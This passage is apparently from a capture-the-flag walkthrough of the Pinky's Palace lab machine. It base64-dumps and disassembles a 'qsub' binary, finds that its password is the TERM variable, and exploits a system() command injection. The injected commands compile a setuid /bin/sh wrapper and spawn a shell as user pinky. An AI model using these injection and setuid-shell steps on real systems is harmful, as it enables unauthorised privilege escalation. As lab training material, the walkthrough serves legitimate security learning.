AAAAAAAAAABWCAAAAAAAAGYIAAAAAAAAdggAAAAAAACGCAAAAAAAAJYIAAAAAAAApggAAAAAAAC2
CAAAAAAAAMYIAAAAAAAA1ggAAAAAAADmCAAAAAAAAPYIAAAAAAAABgkAAAAAAAAWCQAAAAAAAAAA
AAAAAAAAiCAgAAAAAABHQ0M6IChEZWJpYW4gNi4zLjAtMTgrZGViOXUxKSA2LjMuMCAyMDE3MDUx
NgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAA
AwACAFQCAAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCAAAA
AAAAAAAAAAAAAAAAAAAAAwAFAMACAAAAAAAAAAAAAAAAAAAAAAAAAwAGALgEAAAAAAAAAAAAAAAA
AAAAAAAAAwAHALoFAAAAAAAAAAAAAAAAAAAAAAAAAwAIAOgFAAAAAAAAAAAAAAAAAAAAAAAAAwAJ
ABgGAAAAAAAAAAAAAAAAAAAAAAAAAwAKAPAGAAAAAAAAAAAAAAAAAAAAAAAAAwALACgIAAAAAAAA
AAAAAAAAAAAAAAAAAwAMAEAIAAAAAAAAAAAAAAAAAAAAAAAAAwANACAJAAAAAAAAAAAAAAAAAAAA
AAAAAwAOADAJAAAAAAAAAAAAAAAAAAAAAAAAAwAPAEQMAAAAAAAAAAAAAAAAAAAAAAAAAwAQAFAM
AAAAAAAAAAAAAAAAAAAAAAAAAwARAAgNAAAAAAAAAAAAAAAAAAAAAAAAAwASAFANAAAAAAAAAAAA
AAAAAAAAAAAAAwATANgdIAAAAAAAAAAAAAAAAAAAAAAAAwAUAOAdIAAAAAAAAAAAAAAAAAAAAAAA
AwAVAOgdIAAAAAAAAAAAAAAAAAAAAAAAAwAWAPAdIAAAAAAAAAAAAAAAAAAAAAAAAwAXANAfIAAA
AAAAAAAAAAAAAAAAAAAAAwAYAAAgIAAAAAAAAAAAAAAAAAAAAAAAAwAZAIAgIAAAAAAAAAAAAAAA
AAAAAAAAAwAaAJAgIAAAAAAAAAAAAAAAAAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx
/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAVAOgdIAAAAAAAAAAAAAAAAAAZAAAAAgAOAGAJAAAAAAAA
AAAAAAAAAAAbAAAAAgAOAKAJAAAAAAAAAAAAAAAAAAAuAAAAAgAOAPAJAAAAAAAAAAAAAAAAAABE
AAAAAQAaAJAgIAAAAAAAAQAAAAAAAABTAAAAAQAUAOAdIAAAAAAAAAAAAAAAAAB6AAAAAgAOADAK
AAAAAAAAAAAAAAAAAACGAAAAAQATANgdIAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAA
AAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACsAAAAAQASAHgOAAAAAAAAAAAAAAAAAAC6AAAA
AQAVAOgdIAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADGAAAAAAATAOAdIAAA
AAAAAAAAAAAAAADXAAAAAQAWAPAdIAAAAAAAAAAAAAAAAADgAAAAAAATANgdIAAAAAAAAAAAAAAA
AADzAAAAAAARAAgNAAAAAAAAAAAAAAAAAAAGAQAAAQAYAAAgIAAAAAAAAAAAAAAAAAAcAQAAEgAO
AEAMAAAAAAAAAgAAAAAAAAAsAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABAAQAAIAAAAAAAAAAAAAAA
AAAAAAAAAAABAgAAIAAZAIAgIAAAAAAAAAAAAAAAAABcAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABu
AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACFAQAAEAAZAJAgIAAAAAAAAAAAAAAAAAAmAQAAEgAPAEQM
AAAAAAAAAAAAAAAAAACMAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACgAQAAEgAAAAAAAAAAAAAAAAAA
AAAAAAC3AQAAEgAAAAAAAAAAAAAAAAAAAAAAAAB+AgAAEgAAAAAAAAAAAAAAAAAAAAAAAADLAQAA
EgAAAAAAAAAAAAAAAAAAAAAAAADgAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAD/AQAAEAAZAIAgIAAA
AAAAAAAAAAAAAAAMAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAgAgAAIAAAAAAAAAAAAAAAAAAAAAAA
AAAvAgAAEQIZAIggIAAAAAAAAAAAAAAAAAA8AgAAEQAQAFAMAAAAAAAABAAAAAAAAABLAgAAEgAO
ANALAAAAAAAAZQAAAAAAAADSAAAAEAAaAJggIAAAAAAAAAAAAAAAAAAFAgAAEgAOADAJAAAAAAAA
KwAAAAAAAABbAgAAEgAAAAAAAAAAAAAAAAAAAAAAAABwAgAAEAAaAJAgIAAAAAAAAAAAAAAAAAB8
AgAAEgAAAAAAAAAAAAAAAAAAAAAAAACSAgAAEgAOAJcKAAAAAAAAMwEAAAAAAACXAgAAIAAAAAAA
AAAAAAAAAAAAAAAAAACrAgAAEgAAAAAAAAAAAAAAAAAAAAAAAADFAgAAEgAAAAAAAAAAAAAAAAAA
AAAAAADXAgAAEQIZAJAgIAAAAAAAAAAAAAAAAADjAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAD9AgAA
IgAAAAAAAAAAAAAAAAAAAAAAAABVAgAAEgALACgIAAAAAAAAAAAAAAAAAAAZAwAAEgAOAGAKAAAA
AAAANwAAAAAAAAAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMA
X19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC42OTcyAF9fZG9fZ2xvYmFsX2R0b3JzX2F1
eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9l
bnRyeQBxc3ViLmMAX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9E
WU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZT
RVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdp
c3RlclRNQ2xvbmVUYWJsZQBwdXRzQEBHTElCQ18yLjIuNQBzZXRyZXN1aWRAQEdMSUJDXzIuMi41
AF9lZGF0YQBzdHJsZW5AQEdMSUJDXzIuMi41AHNldHJlc2dpZEBAR0xJQkNfMi4yLjUAc3lzdGVt
QEBHTElCQ18yLjIuNQBnZXRldWlkQEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJ
QkNfMi4yLjUAX19kYXRhX3N0YXJ0AHN0cmNtcEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18A
X19kc29faGFuZGxlAF9JT19zdGRpbl91c2VkAF9fbGliY19jc3VfaW5pdABnZXRlZ2lkQEBHTElC
Q18yLjIuNQBfX2Jzc19zdGFydABhc3ByaW50ZkBAR0xJQkNfMi4yLjUAbWFpbgBfSnZfUmVnaXN0
ZXJDbGFzc2VzAF9faXNvYzk5X3NjYW5mQEBHTElCQ18yLjcAZXhpdEBAR0xJQkNfMi4yLjUAX19U
TUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZUBAR0xJQkNf
Mi4yLjUAc2VuZAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10
YWcALm5vdGUuZ251LmJ1aWxkLWlkAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJz
aW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5nb3QALnRl
eHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmlu
aV9hcnJheQAuamNyAC5keW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AgAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAEA
AAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAIAAAAAAABUAgAAAAAAACAAAAAAAAAAAAAA
AAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCAAAAAAAAdAIAAAAAAAAkAAAA
AAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAgAAAAAAAJgCAAAA
AAAAJAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAwAIAAAAA
AADAAgAAAAAAAPgBAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAAAAAA
ALgEAAAAAAAAuAQAAAAAAAACAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD///9v
AgAAAAAAAAC6BQAAAAAAALoFAAAAAAAAKgAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABr
AAAA/v//bwIAAAAAAAAA6AUAAAAAAADoBQAAAAAAADAAAAAAAAAABgAAAAEAAAAIAAAAAAAAAAAA
AAAAAAAAegAAAAQAAAACAAAAAAAAABgGAAAAAAAAGAYAAAAAAADYAAAAAAAAAAUAAAAAAAAACAAA
AAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAADwBgAAAAAAAPAGAAAAAAAAOAEAAAAAAAAFAAAA
GAAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAAKAgAAAAAAAAoCAAAAAAAABcAAAAA
AAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAEAIAAAAAAAAQAgAAAAA
AADgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAAAgCQAAAAAA
ACAJAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACdAAAAAQAAAAYAAAAAAAAA
MAkAAAAAAAAwCQAAAAAAABIDAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAowAAAAEAAAAG
AAAAAAAAAEQMAAAAAAAARAwAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkA
AAABAAAAAgAAAAAAAABQDAAAAAAAAFAMAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
AAAAAACxAAAAAQAAAAIAAAAAAAAACA0AAAAAAAAIDQAAAAAAAEQAAAAAAAAAAAAAAAAAAAAEAAAA
AAAAAAAAAAAAAAAAvwAAAAEAAAACAAAAAAAAAFANAAAAAAAAUA0AAAAAAAAsAQAAAAAAAAAAAAAA
AAAACAAAAAAAAAAAAAAAAAAAAMkAAAAOAAAAAwAAAAAAAADYHSAAAAAAANgdAAAAAAAACAAAAAAA
AAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADVAAAADwAAAAMAAAAAAAAA4B0gAAAAAADgHQAAAAAA
AAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA4QAAAAEAAAADAAAAAAAAAOgdIAAAAAAA
6B0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOYAAAAGAAAAAwAAAAAAAADw
HSAAAAAAAPAdAAAAAAAA4AEAAAAAAAAGAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACYAAAAAQAAAAMA
AAAAAAAA0B8gAAAAAADQHwAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA7wAA
AAEAAAADAAAAAAAAAAAgIAAAAAAAACAAAAAAAACAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAA
AAAAAPgAAAABAAAAAwAAAAAAAACAICAAAAAAAIAgAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAA
AAAAAAAAAAAAAAD+AAAACAAAAAMAAAAAAAAAkCAgAAAAAACQIAAAAAAAAAgAAAAAAAAAAAAAAAAA
AAABAAAAAAAAAAAAAAAAAAAAAwEAAAEAAAAwAAAAAAAAAAAAAAAAAAAAkCAAAAAAAAAtAAAAAAAA
AAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAMAgAAAAAAAA
mAcAAAAAAAAdAAAALwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABY
KAAAAAAAAB4DAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAA
AAAAAAAAdisAAAAAAAAMAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==
www-data@Pinkys-Palace:/home/stefano/tools$
```

###### Binary Exploitation

```sh
root@kali:~/Pinkys-Palace2/binary# vim qsub.b64
root@kali:~/Pinkys-Palace2/binary# base64 -d qsub.b64 > qsub
root@kali:~/Pinkys-Palace2/binary# chmod +x qsub
root@kali:~/Pinkys-Palace2/binary# file qsub
qsub: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e35337e922a770c832f5e2b0a9afc5819887bd10, not stripped
root@kali:~/Pinkys-Palace2/binary#
```

```sh
u64@vm:~/Desktop$ ltrace ./qsub
printf("%s <Message>\n", "./qsub"./qsub <Message>
)                                                                                            = 17
exit(0 <no return ...>
+++ exited (status 0) +++
u64@vm:~/Desktop$
```

```sh
u64@vm:~/Desktop$ ltrace ./qsub test
getenv("TERM")                                                                                                                = "xterm-256color"
printf("[+] Input Password: ")                                                                                                = 20
__isoc99_scanf(0x555e1cdc2cb5, 0x7ffed1bb0520, 0x7f0e15fe0780, 20[+] Input Password: test
)                                                            = 1
strlen("test")                                                                                                                = 4
strcmp("test", "xterm-256color")                                                                                              = -4
puts("[!] Incorrect Password!"[!] Incorrect Password!
)                                                                                               = 24
exit(0 <no return ...>
+++ exited (status 0) +++
u64@vm:~/Desktop$
```

```sh
u64@vm:~/Desktop$ ./qsub message-1
[+] Input Password: xterm-256color
sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
[+] Welcome to Question Submit!
u64@vm:~/Desktop$
```

```sh
u64@vm:~/Desktop$ env | grep TERM
TERM=xterm-256color
u64@vm:~/Desktop$
```

![](images/33.png)

```sh
➜  ~ python -c "print 'A'*42"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  ~
```

```sh
u64@vm:~/Desktop$ ./qsub message-2
[+] Input Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bad hacker! Go away!
u64@vm:~/Desktop$
```

```sh
u64@vm:~/Desktop$ r2 -d ./qsub test
Process with PID 37119 started...
= attach 37119 37119
bin.baddr 0x5616c4ca1000
Using 0x5616c4ca1000
asm.bits 64
 -- There is no F5 key in radare2 yet
[0x7f40c6b27c30]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 37119 37119
37119
[0x7f40c6b27c30]> pdf @main
            ;-- main:
/ (fcn) sym.main 307
|   sym.main ();
|           ; var int local_60h @ rbp-0x60
|           ; var int local_54h @ rbp-0x54
|           ; var int local_50h @ rbp-0x50
|           ; var int local_10h @ rbp-0x10
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|           ; DATA XREF from 0x5616c4ca194d (entry0)
|           0x5616c4ca1a97      55             push rbp
|           0x5616c4ca1a98      4889e5         mov rbp, rsp
|           0x5616c4ca1a9b      4883ec60       sub rsp, 0x60           ; '`'
|           0x5616c4ca1a9f      897dac         mov dword [local_54h], edi
|           0x5616c4ca1aa2      488975a0       mov qword [local_60h], rsi
|           0x5616c4ca1aa6      837dac01       cmp dword [local_54h], 1 ; [0x1:4]=-1 ; 1
|       ,=< 0x5616c4ca1aaa      7f25           jg 0x5616c4ca1ad1
|       |   0x5616c4ca1aac      488b45a0       mov rax, qword [local_60h]
|       |   0x5616c4ca1ab0      488b00         mov rax, qword [rax]
|       |   0x5616c4ca1ab3      4889c6         mov rsi, rax
|       |   0x5616c4ca1ab6      488d3dd00100.  lea rdi, str.s__Message ; 0x5616c4ca1c8d ; "%s <Message>\n"
|       |   0x5616c4ca1abd      b800000000     mov eax, 0
|       |   0x5616c4ca1ac2      e8e9fdffff     call sym.imp.printf     ; int printf(const char *format)
|       |   0x5616c4ca1ac7      bf00000000     mov edi, 0
|       |   0x5616c4ca1acc      e83ffeffff     call sym.imp.exit       ; void exit(int status)
|       `-> 0x5616c4ca1ad1      488d3dc30100.  lea rdi, str.TERM       ; 0x5616c4ca1c9b ; "TERM"
|           0x5616c4ca1ad8      e873fdffff     call sym.imp.getenv     ; char *getenv(const char *name)
|           0x5616c4ca1add      488945f8       mov qword [local_8h], rax
|           0x5616c4ca1ae1      488d3db80100.  lea rdi, str.Input_Password: ; 0x5616c4ca1ca0 ; "[+] Input Password: "
|           0x5616c4ca1ae8      b800000000     mov eax, 0
|           0x5616c4ca1aed      e8befdffff     call sym.imp.printf     ; int printf(const char *format)
|           0x5616c4ca1af2      488d45b0       lea rax, [local_50h]
|           0x5616c4ca1af6      4889c6         mov rsi, rax
|           0x5616c4ca1af9      488d3db50100.  lea rdi, [0x5616c4ca1cb5] ; "%s"
|           0x5616c4ca1b00      b800000000     mov eax, 0
|           0x5616c4ca1b05      e8f6fdffff     call sym.imp.__isoc99_scanf
|           0x5616c4ca1b0a      488d45b0       lea rax, [local_50h]
|           0x5616c4ca1b0e      4889c7         mov rdi, rax
|           0x5616c4ca1b11      e86afdffff     call sym.imp.strlen     ; size_t strlen(const char *s)
|           0x5616c4ca1b16      4883f828       cmp rax, 0x28           ; '(' ; 40
|       ,=< 0x5616c4ca1b1a      7616           jbe 0x5616c4ca1b32
|       |   0x5616c4ca1b1c      488d3d950100.  lea rdi, str.Bad_hacker__Go_away ; 0x5616c4ca1cb8 ; "Bad hacker! Go away!"
|       |   0x5616c4ca1b23      e838fdffff     call sym.imp.puts       ; int puts(const char *s)
|       |   0x5616c4ca1b28      bf00000000     mov edi, 0
|       |   0x5616c4ca1b2d      e8defdffff     call sym.imp.exit       ; void exit(int status)
|       `-> 0x5616c4ca1b32      488b55f8       mov rdx, qword [local_8h]
|           0x5616c4ca1b36      488d45b0       lea rax, [local_50h]
|           0x5616c4ca1b3a      4889d6         mov rsi, rdx
|           0x5616c4ca1b3d      4889c7         mov rdi, rax
|           0x5616c4ca1b40      e88bfdffff     call sym.imp.strcmp     ; int strcmp(const char *s1, const char *s2)
|           0x5616c4ca1b45      85c0           test eax, eax
|       ,=< 0x5616c4ca1b47      7513           jne 0x5616c4ca1b5c
|       |   0x5616c4ca1b49      488d3d800100.  lea rdi, str.Welcome_to_Question_Submit ; 0x5616c4ca1cd0 ; "[+] Welcome to Question Submit!"
|       |   0x5616c4ca1b50      b800000000     mov eax, 0
|       |   0x5616c4ca1b55      e856fdffff     call sym.imp.printf     ; int printf(const char *format)
|      ,==< 0x5616c4ca1b5a      eb16           jmp 0x5616c4ca1b72
|      |`-> 0x5616c4ca1b5c      488d3d8d0100.  lea rdi, str.Incorrect_Password ; 0x5616c4ca1cf0 ; "[!] Incorrect Password!"
|      |    0x5616c4ca1b63      e8f8fcffff     call sym.imp.puts       ; int puts(const char *s)
|      |    0x5616c4ca1b68      bf00000000     mov edi, 0
|      |    0x5616c4ca1b6d      e89efdffff     call sym.imp.exit       ; void exit(int status)
|      |    ; JMP XREF from 0x5616c4ca1b5a (sym.main)
|      `--> 0x5616c4ca1b72      e869fdffff     call sym.imp.getegid
|           0x5616c4ca1b77      8945f4         mov dword [local_ch], eax
|           0x5616c4ca1b7a      e841fdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
|           0x5616c4ca1b7f      8945f0         mov dword [local_10h], eax
|           0x5616c4ca1b82      8b55f4         mov edx, dword [local_ch]
|           0x5616c4ca1b85      8b4df4         mov ecx, dword [local_ch]
|           0x5616c4ca1b88      8b45f4         mov eax, dword [local_ch]
|           0x5616c4ca1b8b      89ce           mov esi, ecx
|           0x5616c4ca1b8d      89c7           mov edi, eax
|           0x5616c4ca1b8f      b800000000     mov eax, 0
|           0x5616c4ca1b94      e8f7fcffff     call sym.imp.setresgid
|           0x5616c4ca1b99      8b55f0         mov edx, dword [local_10h]
|           0x5616c4ca1b9c      8b4df0         mov ecx, dword [local_10h]
|           0x5616c4ca1b9f      8b45f0         mov eax, dword [local_10h]
|           0x5616c4ca1ba2      89ce           mov esi, ecx
|           0x5616c4ca1ba4      89c7           mov edi, eax
|           0x5616c4ca1ba6      b800000000     mov eax, 0
|           0x5616c4ca1bab      e8c0fcffff     call sym.imp.setresuid
|           0x5616c4ca1bb0      488b45a0       mov rax, qword [local_60h]
|           0x5616c4ca1bb4      4883c008       add rax, 8
|           0x5616c4ca1bb8      488b00         mov rax, qword [rax]
|           0x5616c4ca1bbb      4889c7         mov rdi, rax
|           0x5616c4ca1bbe      e89dfeffff     call sym.send
|           0x5616c4ca1bc3      b800000000     mov eax, 0
|           0x5616c4ca1bc8      c9             leave
\           0x5616c4ca1bc9      c3             ret
[0x5616c4ca1a97]> pdc @main
function sym.main () {
    //  8 basic blocks

    loc_0x5616c4ca1a97:

  //DATA XREF from 0x5616c4ca194d (entry0)
       push rbp
       rbp = rsp
       rsp -= 0x60              //'`'
       dword [local_54h] = edi
       qword [local_60h] = rsi
       var = dword [local_54h] - 1 //[0x1:4]=-1 ; 1
       if (var > 0) goto 0x5616c4ca1ad1 //unlikely
       {
        loc_0x5616c4ca1ad1:

           rdi = "TERM"RM         //0x5616c4ca1c9b ; str.TERM

           char *getenv(const char * name : 0x5616c4ca1c9b = TERM)
           qword [local_8h] = rax
           rdi = str"[+] Input Password: "0x5616c4ca1ca0 ; str.Input_Password:
           eax = 0

           int printf(const char * format : 0x5616c4ca1ca0 = [+] Input Password:)
           rax = [local_50h]
           rsi = rax
           rdi = [0x5616c4ca1cb5]   //"%s"
           eax = 0
           sym.imp.__isoc99_scanf ()
           rax = [local_50h]
           rdi = rax

           size_t strlen(const char * s : 0x00177fb0 =)
           var = rax - 0x28         //'(' ; 40
           if (((unsigned) var) <= 0) goto 0x5616c4ca1b32 //unlikely
           {
            loc_0x5616c4ca1b32:

               rdx = qword [local_8h]
               rax = [local_50h]
               rsi = rdx
               rdi = rax

               int strcmp(const char * s1 : 0x00177fb0 =, const char * s2 : 0x5616c4ca1b0a = H.E.H...j...H..(v.H.=..)
               var = eax & eax
               if (var) goto 0x5616c4ca1b5c //likely
               {
                loc_0x5616c4ca1b5c:

                   rdi = str"[!] Incorrect Password!"0x5616c4ca1cf0 ; str.Incorrect_Password

                   int puts(const char * s : 0x5616c4ca1cf0 = [!] Incorrect Password)
                   edi = 0

                   void exit(int status : 0x00000000 = 4294967295)
                loc_0x5616c4ca1b49:

                   rdi = str"[+] Welcome to Question Submit!"0x5616c4ca1cd0 ; str.Welcome_to_Question_Submit
                   eax = 0

                   int printf(const char * format : 0x5616c4ca1cd0 = [+] Welcome to Ques)
                   goto 0x5616c4ca1b72
               } else {
               }
           } else {
           }
      }
      return;

}
[0x7f0d99bbdc30]> afl
0x55dfe3240000    3 73   -> 75   sym.imp.__libc_start_main
0x55dfe3240828    3 23           sym._init
0x55dfe3240850    1 6            sym.imp.getenv
0x55dfe3240860    1 6            sym.imp.puts
0x55dfe3240870    1 6            sym.imp.setresuid
0x55dfe3240880    1 6            sym.imp.strlen
0x55dfe3240890    1 6            sym.imp.setresgid
0x55dfe32408a0    1 6            sym.imp.system
0x55dfe32408b0    1 6            sym.imp.printf
0x55dfe32408c0    1 6            sym.imp.geteuid
0x55dfe32408d0    1 6            sym.imp.strcmp
0x55dfe32408e0    1 6            sym.imp.getegid
0x55dfe32408f0    1 6            sym.imp.asprintf
0x55dfe3240900    1 6            sym.imp.__isoc99_scanf
0x55dfe3240910    1 6            sym.imp.exit
0x55dfe3240920    1 6            sub.__cxa_finalize_920
0x55dfe3240930    1 43           entry0
0x55dfe3240960    4 50   -> 44   sym.deregister_tm_clones
0x55dfe32409a0    4 66   -> 57   sym.register_tm_clones
0x55dfe32409f0    5 50           sym.__do_global_dtors_aux
0x55dfe3240a30    4 48   -> 42   entry1.init
0x55dfe3240a60    1 55           sym.send
0x55dfe3240a97    8 307          sym.main
0x55dfe3240bd0    4 101          sym.__libc_csu_init
0x55dfe3240c40    1 2            sym.__libc_csu_fini
0x55dfe3240c44    1 9            sym._fini
0x55dfe3441fd8    1 40           reloc.__libc_start_main
[0x7f0d99bbdc30]>
[0x7f0d99bbdc30]> pdf @sym.send
/ (fcn) sym.send 55
|   sym.send ();
|           ; var int local_18h @ rbp-0x18
|           ; var int local_8h @ rbp-0x8
|           ; CALL XREF from 0x55dfe3240bbe (sym.main)
|           0x55dfe3240a60      55             push rbp
|           0x55dfe3240a61      4889e5         mov rbp, rsp
|           0x55dfe3240a64      4883ec20       sub rsp, 0x20
|           0x55dfe3240a68      48897de8       mov qword [local_18h], rdi
|           0x55dfe3240a6c      488b55e8       mov rdx, qword [local_18h]
|           0x55dfe3240a70      488d45f8       lea rax, [local_8h]
|           0x55dfe3240a74      488d35dd0100.  lea rsi, str.bin_echo__s_____home_pinky_messages_stefano_msg.txt ; 0x55dfe3240c58 ; "/bin/echo %s >> /home/pinky/messages/stefano_msg.txt"
|           0x55dfe3240a7b      4889c7         mov rdi, rax
|           0x55dfe3240a7e      b800000000     mov eax, 0
|           0x55dfe3240a83      e868feffff     call sym.imp.asprintf
|           0x55dfe3240a88      488b45f8       mov rax, qword [local_8h]
|           0x55dfe3240a8c      4889c7         mov rdi, rax
|           0x55dfe3240a8f      e80cfeffff     call sym.imp.system     ; int system(const char *string)
|           0x55dfe3240a94      90             nop
|           0x55dfe3240a95      c9             leave
\           0x55dfe3240a96      c3             ret
[0x55dfe3240a60]>
```

![](images/34.png)

```sh
stefano@Pinkys-Palace:~/tools$ ./qsub "1;touch /tmp/owned;whoami"
[+] Input Password: xterm-256color
1
[+] Welcome to Question Submit!
stefano@Pinkys-Palace:~/tools$
```

```sh
stefano@Pinkys-Palace:~/tools$ ls -l /tmp/
total 8
-rw-r--r-- 1 pinky stefano    0 Apr 29 14:08 owned
drwx------ 3 root  root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-apache2.service-wjrzTA
drwx------ 3 root  root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-systemd-timesyncd.service-HKNOVK
stefano@Pinkys-Palace:~/tools$
```

`setuid.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main( int argc, char *argv[] )
{
	setreuid(0,0);
	execve("/bin/sh", NULL, NULL);
}
```

```sh
stefano@Pinkys-Palace:~/tools$ mount | grep shm
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
stefano@Pinkys-Palace:~/tools$
```

```sh
stefano@Pinkys-Palace:~/tools$ which gcc
/usr/bin/gcc
stefano@Pinkys-Palace:~/tools$
```

```sh
stefano@Pinkys-Palace:~/tools$ vi /tmp/setuid.c
```

```sh
stefano@Pinkys-Palace:~/tools$ ./qsub "1;gcc /tmp/setuid.c -o /tmp/pinky;chmod +xs /tmp/pinky;whoami"
[+] Input Password: xterm-256color
1
[+] Welcome to Question Submit!
stefano@Pinkys-Palace:~/tools$
```

```sh
stefano@Pinkys-Palace:~/tools$ cd /tmp/
stefano@Pinkys-Palace:/tmp$ ls -l
total 24
-rw-r--r-- 1 pinky   stefano    0 Apr 29 14:08 owned
-rwsr-sr-x 1 pinky   stefano 8696 Apr 29 14:23 pinky
-rw-r--r-- 1 stefano stefano  146 Apr 29 14:15 setuid.c
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-apache2.service-wjrzTA
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-systemd-timesyncd.service-HKNOVK
stefano@Pinkys-Palace:/tmp$
```

```sh
stefano@Pinkys-Palace:/tmp$ file pinky
pinky: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f9acb9e8ded30987f0ab9391f119693b3a6a90de, not stripped
stefano@Pinkys-Palace:/tmp$
```

```sh
stefano@Pinkys-Palace:/tmp$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)
stefano@Pinkys-Palace:/tmp$
stefano@Pinkys-Palace:/tmp$ ./pinky
$ id
uid=1002(stefano) gid=1002(stefano) euid=1000(pinky) groups=1002(stefano)
$ ls -l
total 24
-rw-r--r-- 1 pinky   stefano    0 Apr 29 14:08 owned
